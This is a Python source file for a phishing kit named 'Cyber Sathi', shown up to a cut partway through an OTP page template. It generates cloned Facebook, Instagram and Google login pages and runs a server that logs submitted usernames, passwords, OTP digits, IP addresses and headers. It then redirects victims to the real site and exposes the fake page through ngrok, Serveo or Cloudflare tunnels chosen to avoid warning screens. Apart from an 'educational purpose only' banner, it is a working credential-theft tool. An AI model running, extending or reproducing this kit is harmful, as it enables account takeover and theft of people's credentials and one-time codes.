#!/usr/bin/env python3
"""
🔥 CYBER SATHI - Advanced Phishing Tool
With Templates Folder & Domain Support
Fixed Ngrok and Parser Issues
"""

import os
import sys
import json
import time
import random
import string
import threading
import socket
import requests
import subprocess
import urllib.parse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler


# Configuration
VERSION = "2.6"
AUTHOR = "Cyber Sathi Team"
TEMPLATES_DIR = "templates"
DATA_DIR = "captured_data"
NGROK_DIR = "ngrok_tunnels"

# Colors for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Create necessary directories
def setup_directories():
    """Create required directories"""
    directories = [TEMPLATES_DIR, DATA_DIR, NGROK_DIR]
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"{Colors.GREEN}[+] Created directory: {directory}{Colors.RESET}")

# Global variables
collected_data = []
current_server = None
is_running = False
selected_template = ""
ngrok_url = ""

def print_banner():
    """Print fancy banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██████╗██╗   ██╗██████╗ ███████╗██████╗                ║
║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗               ║
║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝               ║
║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗               ║
║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║               ║
║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝               ║
║                                                          ║
║      ███████╗ █████╗ ████████╗██╗  ██╗██╗                ║
║      ██╔════╝██╔══██╗╚══██╔══╝██║  ██║██║                ║
║      ███████╗███████║   ██║   ███████║██║                ║
║      ╚════██║██╔══██║   ██║   ██╔══██║██║                ║
║      ███████║██║  ██║   ██║   ██║  ██║██║                ║
║      ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝               ║
║                                                          ║
║    ╔════════════════════════════════════════════════╗    ║
║    ║      ADVANCED PHISHING TOOL v{VERSION}        ║    ║
║    ║      Fixed Ngrok & Parser Issues              ║    ║
║    ╚════════════════════════════════════════════════╝    ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.YELLOW}⚠  FOR EDUCATIONAL PURPOSE ONLY{Colors.RESET}
{Colors.YELLOW}⚠  Use only on systems you own or have permission!{Colors.RESET}
{Colors.CYAN}{'='*65}{Colors.RESET}
"""
    print(banner)

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_random_string(length=8):
    """Generate random string for URLs"""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def check_ngrok():
    """Check if ngrok is installed"""
    try:
        result = subprocess.run(['ngrok', '--version'], 
                              capture_output=True, text=True, 
                              timeout=5)
        return True
    except:
        return False

def start_ngrok_tunnel(port, subdomain=None):
    """Start ngrok tunnel with visitor bypass attempt"""
    global ngrok_url
    
    if not check_ngrok():
        print(f"{Colors.RED}[!] Ngrok not found!{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Install: https://ngrok.com/download{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Or use these FREE alternatives:{Colors.RESET}")
        print(f"{Colors.WHITE}   1. Cloudflare Tunnel (Recommended){Colors.RESET}")
        print(f"{Colors.WHITE}   2. Serveo.net{Colors.RESET}")
        print(f"{Colors.WHITE}   3. LocalXpose{Colors.RESET}")
        return None
    
    try:
        # Ngrok with custom header to bypass warning
        cmd = ['ngrok', 'http', str(port)]
        if subdomain:
            cmd.extend(['--subdomain', subdomain])
        
        # Add region for better performance
        cmd.extend(['--region', 'in'])  # India region
        
        print(f"{Colors.BLUE}[*] Starting Ngrok tunnel (Free version warning may appear)...{Colors.RESET}")
        
        # Start ngrok
        ngrok_proc = subprocess.Popen(cmd, 
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True)
        
        time.sleep(7)  # Give more time for tunnel to establish
        
        # Get tunnel URL
        try:
            for _ in range(10):  # Try multiple times
                try:
                    response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                    if response.status_code == 200:
                        tunnels = response.json().get('tunnels', [])
                        for tunnel in tunnels:
                            if tunnel.get('proto') == 'https':
                                ngrok_url = tunnel.get('public_url')
                                print(f"{Colors.GREEN}[+] Ngrok URL: {ngrok_url}{Colors.RESET}")
                                print(f"{Colors.YELLOW}[!] NOTE: Free users need to click 'Visit Site' button{Colors.RESET}")
                                print(f"{Colors.YELLOW}[!] Pro tip: Use Cloudflare Tunnel for no warnings{Colors.RESET}")
                                
                                # Save tunnel info
                                tunnel_info = {
                                    'url': ngrok_url,
                                    'port': port,
                                    'time': datetime.now().isoformat(),
                                    'template': selected_template,
                                    'warning': "Free tier: Visitors need to click 'Visit Site'"
                                }
                                
                                with open(f'{NGROK_DIR}/tunnel_{int(time.time())}.json', 'w') as f:
                                    json.dump(tunnel_info, f, indent=2)
                                
                                return ngrok_url
                    time.sleep(2)
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.RED}[!] Could not get Ngrok URL: {e}{Colors.RESET}")
        
        return None
        
    except Exception as e:
        print(f"{Colors.RED}[!] Ngrok error: {e}{Colors.RESET}")
        return None

def setup_serveo(port):
    """Use Serveo.net as free alternative to Ngrok"""
    print(f"{Colors.BLUE}[*] Setting up Serveo.net tunnel...{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Serveo.net is FREE and has no 'Visit Site' page{Colors.RESET}")
    
    try:
        # Command for Serveo
        cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
        print(f"{Colors.YELLOW}[*] Run this command in another terminal:{Colors.RESET}")
        print(f"{Colors.WHITE}{cmd}{Colors.RESET}")
        
        # Try to auto-run
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait a bit
            time.sleep(3)
            
            print(f"{Colors.GREEN}[*] Serveo tunnel started{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Your URL will be shown in the terminal{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Usually looks like: https://something.serveo.net{Colors.RESET}")
            
            return "serveo.net"
        except:
            print(f"{Colors.RED}[!] Could not start Serveo automatically{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Please run the command manually in new terminal{Colors.RESET}")
            
    except Exception as e:
        print(f"{Colors.RED}[!] Serveo error: {e}{Colors.RESET}")
    
    return None

def setup_custom_domain():
    """Setup custom domain options with better explanations"""
    print(f"\n{Colors.CYAN}[+] Domain Options:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Use Ngrok random URL (Free) ⚠️")
    print(f"   ↳ Visitors need to click 'Visit Site' button")
    print(f"2. Use Ngrok with custom subdomain (Pro required - $)")
    print(f"   ↳ No warning page, direct access")
    print(f"3. Use Serveo.net (Free) ✅")
    print(f"   ↳ Recommended - No restrictions, No 'Visit Site' page")
    print(f"4. Use Cloudflare Tunnel (Free) ✅")
    print(f"   ↳ Professional - Best option")
    print(f"5. Use local network only")
    print(f"6. Use custom domain with port forwarding{Colors.RESET}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option (1-6): {Colors.RESET}")
    
    if choice == '1':
        print(f"{Colors.YELLOW}[!] Warning: Ngrok free tier shows 'Visit Site' page{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Victims need to click the button to proceed{Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}[?] Continue? (y/n): {Colors.RESET}")
        if confirm.lower() != 'y':
            return setup_custom_domain()
        return {'type': 'ngrok_random'}
    elif choice == '2':
        subdomain = input(f"{Colors.YELLOW}[?] Enter custom subdomain: {Colors.RESET}")
        return {'type': 'ngrok_subdomain', 'subdomain': subdomain}
    elif choice == '3':
        print(f"{Colors.GREEN}[*] Serveo.net selected - No 'Visit Site' page!{Colors.RESET}")
        return {'type': 'serveo'}
    elif choice == '4':
        print(f"{Colors.GREEN}[*] Cloudflare Tunnel selected{Colors.RESET}")
        return {'type': 'cloudflare'}
    elif choice == '5':
        return {'type': 'local'}
    elif choice == '6':
        domain = input(f"{Colors.YELLOW}[?] Enter your domain (example.com): {Colors.RESET}")
        return {'type': 'custom_domain', 'domain': domain}
    else:
        return {'type': 'ngrok_random'}

def load_templates():
    """Load templates from templates directory"""
    templates = {}
    
    if not os.path.exists(TEMPLATES_DIR):
        print(f"{Colors.RED}[!] Templates directory not found!{Colors.RESET}")
        return templates
    
    # List all HTML files in templates directory
    for file in os.listdir(TEMPLATES_DIR):
        if file.endswith('.html'):
            template_name = file.replace('.html', '')
            template_path = os.path.join(TEMPLATES_DIR, file)
            
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    templates[template_name] = content
                    print(f"{Colors.GREEN}[+] Loaded template: {template_name}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error loading {file}: {e}{Colors.RESET}")
    
    # Create default templates if none exist
    if not templates:
        create_default_templates()
        templates = load_templates()
    
    return templates

def create_default_templates():
    """Create default templates if templates directory is empty"""
    print(f"{Colors.YELLOW}[*] Creating default templates...{Colors.RESET}")
    
    # Facebook template
    facebook_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log in or Sign up</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; max-width: 1000px; gap: 50px; padding: 20px; }
        .left-section { flex: 1; padding-top: 100px; }
        .logo { color: #1877f2; font-size: 60px; font-weight: bold; }
        .tagline { font-size: 28px; margin-top: 10px; }
        .right-section { flex: 1; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px 16px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        .login-btn { background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; padding: 14px; width: 100%; cursor: pointer; }
        .login-btn:hover { background: #166fe5; }
        .forgot-link { text-align: center; display: block; margin: 15px 0; color: #1877f2; text-decoration: none; }
        .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; padding: 14px; margin: 20px auto; display: block; width: 60%; }
        .create-btn:hover { background: #36a420; }
        .create-page { text-align: center; margin-top: 30px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
        </div>
        <div class="right-section">
            <div class="login-box">
                <form method="POST">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot-link">Forgotten password?</a>
                <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
                <button class="create-btn">Create New Account</button>
            </div>
            <div class="create-page">
                <b>Create a Page</b> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>'''
    
    # Instagram template
    instagram_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.cdnfonts.com/css/billabong');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; gap: 50px; max-width: 900px; padding: 20px; }
        .phones { flex: 1; }
        .phones img { width: 100%; max-width: 380px; }
        .login-box { flex: 1; }
        .login-form { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; }
        .logo { font-family: 'Billabong', cursive; font-size: 60px; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 6px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
        .login-btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; margin-top: 15px; cursor: pointer; opacity: 0.7; }
        .login-btn:hover { opacity: 1; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .line { flex: 1; height: 1px; background: #dbdbdb; }
        .or { padding: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .fb-login { color: #385185; font-weight: bold; text-decoration: none; display: block; margin: 15px 0; }
        .forgot-link { color: #00376b; text-decoration: none; font-size: 12px; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 25px; text-align: center; margin-top: 10px; }
        .get-app { text-align: center; margin-top: 20px; }
        .app-stores { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }
        .app-store, .play-store { width: 135px; height: 40px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="phones">
            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=73SVAexZgBW" alt="Instagram phones">
        </div>
        <div class="login-box">
            <div class="login-form">
                <div class="logo">Instagram</div>
                <form method="POST">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="fb-login">Log in with Facebook</a>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            <div class="signup-box">
                Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a>
            </div>
            <div class="get-app">Get the app.</div>
            <div class="app-stores">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="app-store">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Play Store" class="play-store">
            </div>
        </div>
    </div>
</body>
</html>'''
    
    # Google template
    google_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { color: #202124; }
        .header { padding: 20px; text-align: right; }
        .header a { margin: 0 10px; color: rgba(0,0,0,0.87); text-decoration: none; font-size: 14px; }
        .header a:hover { text-decoration: underline; }
        .main { display: flex; flex-direction: column; align-items: center; margin-top: 120px; }
        .logo { font-size: 92px; font-weight: normal; margin-bottom: 20px; }
        .blue { color: #4285f4; }
        .red { color: #ea4335; }
        .yellow { color: #fbbc05; }
        .green { color: #34a853; }
        .search-box { width: 582px; padding: 14px 20px; border: 1px solid #dfe1e5; border-radius: 24px; font-size: 16px; margin: 20px 0; }
        .search-box:hover { box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
        .buttons { margin: 20px 0; }
        .buttons button { background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; color: #3c4043; font-size: 14px; padding: 10px 16px; margin: 0 5px; cursor: pointer; }
        .buttons button:hover { box-shadow: 0 1px 1px rgba(0,0,0,0.1); border: 1px solid #dadce0; }
        .footer { position: fixed; bottom: 0; width: 100%; background: #f2f2f2; color: #70757a; }
        .footer-top { padding: 15px 30px; border-bottom: 1px solid #dadce0; }
        .footer-bottom { padding: 15px 30px; display: flex; justify-content: space-between; }
        .footer a { color: #70757a; text-decoration: none; margin: 0 15px; font-size: 14px; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="header">
        <a href="#">Gmail</a>
        <a href="#">Images</a>
        <a href="#"><img src="https://img.icons8.com/ios-glyphs/30/000000/menu-2.png" style="vertical-align: middle;"></a>
        <a href="#"><button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer;">Sign in</button></a>
    </div>
    
    <div class="main">
        <div class="logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>
        <form method="POST">
            <input type="text" name="query" class="search-box" placeholder="Search Google or type a URL">
            <div class="buttons">
                <button type="submit">Google Search</button>
                <button type="button">I'm Feeling Lucky</button>
            </div>
        </form>
        <div style="margin-top: 30px; font-size: 13px;">
            Google offered in: <a href="#">हिन्दी</a> <a href="#">বাংলা</a> <a href="#">தமிழ்</a>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-top">India</div>
        <div class="footer-bottom">
            <div>
                <a href="#">About</a>
                <a href="#">Advertising</a>
                <a href="#">Business</a>
                <a href="#">How Search works</a>
            </div>
            <div>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Settings</a>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    # Save templates
    templates = {
        'facebook': facebook_html,
        'instagram': instagram_html,
        'google': google_html
    }
    
    for filename, content in templates.items():
        filepath = os.path.join(TEMPLATES_DIR, f"{filename}.html")
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
    
    print(f"{Colors.GREEN}[+] Created default templates{Colors.RESET}")

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global selected_template
        
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # Load template
            templates = load_templates()
            if selected_template in templates:
                self.wfile.write(templates[selected_template].encode('utf-8'))
            else:
                self.wfile.write(b'<h1>Template not found</h1>')
        
        elif self.path == '/success':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            success_page = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Success</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #f0f2f5; }
                    .success-box { background: white; padding: 50px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .check { color: #42b72a; font-size: 80px; }
                    h1 { color: #1c1e21; margin: 20px 0; }
                    p { color: #65676b; font-size: 18px; }
                    .redirect { margin-top: 30px; color: #8a8d91; }
                </style>
            </head>
            <body>
                <div class="success-box">
                    <div class="check">✓</div>
                    <h1>Login Successful!</h1>
                    <p>You are being redirected to your account...</p>
                    <div class="redirect">
                        If you are not redirected automatically, 
                        <a href="https://facebook.com">click here</a>.
                    </div>
                </div>
                <script>
                    setTimeout(function() {
                        window.location.href = "https://facebook.com";
                    }, 3000);
                </script>
            </body>
            </html>
            '''
            self.wfile.write(success_page.encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        global collected_data
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse form data - FIXED: Using urllib.parse
            parsed_data = urllib.parse.parse_qs(post_data)
            
            # Extract credentials
            credentials = {}
            for key in ['email', 'username', 'password', 'phone', 'login', 'query', 'digit1', 'digit2', 'digit3', 'digit4', 'digit5', 'digit6']:
                if key in parsed_data:
                    credentials[key] = parsed_data[key][0]
            
            # Combine OTP digits
            if 'digit1' in credentials and 'digit6' in credentials:
                otp = ''.join([credentials.get(f'digit{i}', '') for i in range(1, 7)])
                if otp:
                    credentials['otp'] = otp
            
            # Client information
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Create entry
            entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'user_agent': user_agent,
                'template': selected_template,
                'credentials': credentials,
                'headers': dict(self.headers)
            }
            
            # Add to collected data
            collected_data.append(entry)
            
            # Save to file
            log_file = os.path.join(DATA_DIR, 'captured_data.json')
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(entry, ensure_ascii=False) + '\n')
            
            # Print to console
            print(f"{Colors.GREEN}[+] Captured from {client_ip}: {credentials}{Colors.RESET}")
            
            # Redirect to success page
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error in POST handler: {e}{Colors.RESET}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def setup_cloudflare_tunnel(port):
    """Setup Cloudflare Tunnel instructions"""
    print(f"{Colors.BLUE}[*] Cloudflare Tunnel Setup:{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Best option - No 'Visit Site' page, Completely FREE{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Follow these steps:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Install Cloudflared:{Colors.RESET}")
    print(f"{Colors.WHITE}   Windows: Download from https://github.com/cloudflare/cloudflared/releases{Colors.RESET}")
    print(f"{Colors.WHITE}   Linux/Mac: curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared{Colors.RESET}")
    print(f"{Colors.WHITE}2. Make executable: chmod +x cloudflared{Colors.RESET}")
    print(f"{Colors.WHITE}3. Login: ./cloudflared tunnel login{Colors.RESET}")
    print(f"{Colors.WHITE}4. Create tunnel: ./cloudflared tunnel create cyber-sathi{Colors.RESET}")
    print(f"{Colors.WHITE}5. Run tunnel: ./cloudflared tunnel run cyber-sathi{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Or run this command:{Colors.RESET}")
    print(f"{Colors.WHITE}   cloudflared tunnel --url http://localhost:{port}{Colors.RESET}")

def start_phishing_server(template_name, port=8080, domain_config=None):
    """Start phishing server with selected template"""
    global current_server, is_running, selected_template, ngrok_url
    
    selected_template = template_name
    is_running = True
    
    # Create server
    server_address = ('0.0.0.0', port)
    current_server = HTTPServer(server_address, PhishingHandler)
    
    print(f"{Colors.GREEN}[+] Starting {template_name} phishing server...{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Port: {port}{Colors.RESET}")
    
    local_ip = get_local_ip()
    print(f"{Colors.GREEN}[+] Local URL: http://{local_ip}:{port}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Local URL: http://localhost:{port}{Colors.RESET}")
    
    # Setup domain/tunnel
    external_url = None
    
    if domain_config:
        if domain_config['type'] == 'ngrok_random':
            ngrok_url = start_ngrok_tunnel(port)
            if ngrok_url:
                external_url = ngrok_url
                print(f"\n{Colors.GREEN}{'='*65}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Share this URL: {ngrok_url}{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] Victim will see 'Visit Site' button first{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] They must click it to proceed{Colors.RESET}")
                print(f"{Colors.GREEN}{'='*65}{Colors.RESET}")
                
        elif domain_config['type'] == 'ngrok_subdomain':
            ngrok_url = start_ngrok_tunnel(port, domain_config.get('subdomain'))
            if ngrok_url:
                external_url = ngrok_url
            
        elif domain_config['type'] == 'serveo':
            external_url = setup_serveo(port)
            if external_url:
                print(f"\n{Colors.GREEN}{'='*65}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Serveo tunnel instructions shown above{Colors.RESET}")
                print(f"{Colors.GREEN}[+] No 'Visit Site' page - Direct access!{Colors.RESET}")
                print(f"{Colors.GREEN}{'='*65}{Colors.RESET}")
            
        elif domain_config['type'] == 'cloudflare':
            setup_cloudflare_tunnel(port)
            print(f"\n{Colors.GREEN}{'='*65}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Cloudflare setup instructions shown above{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Best option - Professional & Free{Colors.RESET}")
            print(f"{Colors.GREEN}{'='*65}{Colors.RESET}")
            
        elif domain_config['type'] == 'custom_domain':
            print(f"{Colors.YELLOW}[*] Setup your domain to point to: {local_ip}:{port}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Use port forwarding on your router{Colors.RESET}")
    
    if not external_url and domain_config and domain_config['type'] not in ['local', 'custom_domain']:
        print(f"\n{Colors.YELLOW}[!] Using local network only{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Only devices on your network can access:{Colors.RESET}")
        print(f"{Colors.WHITE}    http://{local_ip}:{port}{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}[+] Server is running!{Colors.RESET}")
    print(f"{Colors.CYAN}[+] Press Ctrl+C to stop server{Colors.RESET}")
    print(f"{Colors.CYAN}[+] Monitoring for credentials...{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*65}{Colors.RESET}")
    
    # Start server in thread
    server_thread = threading.Thread(target=current_server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    try:
        # Keep main thread alive
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Stopping server...{Colors.RESET}")
    finally:
        is_running = False
        if current_server:
            current_server.shutdown()
        current_server = None
        
        # Show results
        show_captured_data()

def show_captured_data():
    """Display captured data"""
    global collected_data
    
    print(f"\n{Colors.CYAN}{'='*65}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] CAPTURED DATA SUMMARY:{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*65}{Colors.RESET}")
    
    if not collected_data:
        print(f"{Colors.YELLOW}[!] No data captured yet{Colors.RESET}")
        return
    
    total = len(collected_data)
    print(f"{Colors.GREEN}[+] Total credentials captured: {total}{Colors.RESET}")
    
    for i, entry in enumerate(collected_data, 1):
        print(f"\n{Colors.YELLOW}[{i}] {entry['timestamp']}{Colors.RESET}")
        print(f"   Template: {entry['template']}")
        print(f"   IP: {entry['ip']}")
        print(f"   Credentials: {entry['credentials']}")
    
    # Save summary
    summary_file = os.path.join(DATA_DIR, f'summary_{int(time.time())}.txt')
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write(f"Cyber Sathi - Captured Data Summary\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write(f"Total entries: {len(collected_data)}\n")
        f.write("="*50 + "\n\n")
        
        for entry in collected_data:
            f.write(f"Time: {entry['timestamp']}\n")
            f.write(f"IP: {entry['ip']}\n")
            f.write(f"User Agent: {entry['user_agent']}\n")
            f.write(f"Template: {entry['template']}\n")
            f.write(f"Credentials: {entry['credentials']}\n")
            f.write("-"*30 + "\n")
    
    print(f"\n{Colors.GREEN}[+] Summary saved to: {summary_file}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Detailed data in: {DATA_DIR}/captured_data.json{Colors.RESET}")

def create_new_template():
    """Create a new phishing template"""
    print(f"\n{Colors.CYAN}[+] Create New Template{Colors.RESET}")
    
    template_name = input(f"{Colors.YELLOW}[?] Enter template name: {Colors.RESET}").strip()
    if not template_name:
        print(f"{Colors.RED}[!] Template name required{Colors.RESET}")
        return
    
    # Get template type
    print(f"\n{Colors.WHITE}Select template type:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Login page (username/password)")
    print(f"2. Email verification")
    print(f"3. OTP verification")
    print(f"4. Custom HTML{Colors.RESET}")
    
    template_type = input(f"\n{Colors.YELLOW}[?] Select type (1-4): {Colors.RESET}")
    
    if template_type == '1':
        # Basic login template
        html_template = '''<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 350px; }
        h2 { text-align: center; color: #333; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign In</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>'''
    
    elif template_type == '2':
        # Email verification template
        html_template = '''<!DOCTYPE html>
<html>
<head>
    <title>Verify Your Email</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .verify-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 20px; }
        p { color: #666; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        button:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="verify-box">
        <h2>Verify Your Email Address</h2>
        <p>Please enter your email to verify your account</p>
        <form method="POST">
            <input type="email" name="email" placeholder="Enter your email" required>
            <button type="submit">Verify Email</button>
        </form>
    </div>
</body>
</html>'''
    
    elif template_type == '3':
        # OTP verification template
        html_template = '''<!DOCTYPE html>
<html>
<head>
    <title>OTP Verification</title>
    <style>
